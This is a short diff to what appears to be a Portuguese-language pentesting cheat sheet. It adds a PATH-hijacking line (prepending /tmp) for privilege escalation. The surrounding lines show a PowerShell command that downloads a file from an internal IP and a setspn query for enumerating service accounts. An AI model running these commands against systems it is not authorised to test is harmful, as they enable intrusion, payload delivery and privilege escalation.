@@ -170,6 +170,8 @@ powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.8.1.234
 
 setspn -T medin -Q */*   #detectar spn em usuários, serviço de mapeamento entre o serviço e a conta
 
+export PATH=/tmp:$PATH #trocar o path de um executavel caso seja possivel para elevar privs
+
 
 
 
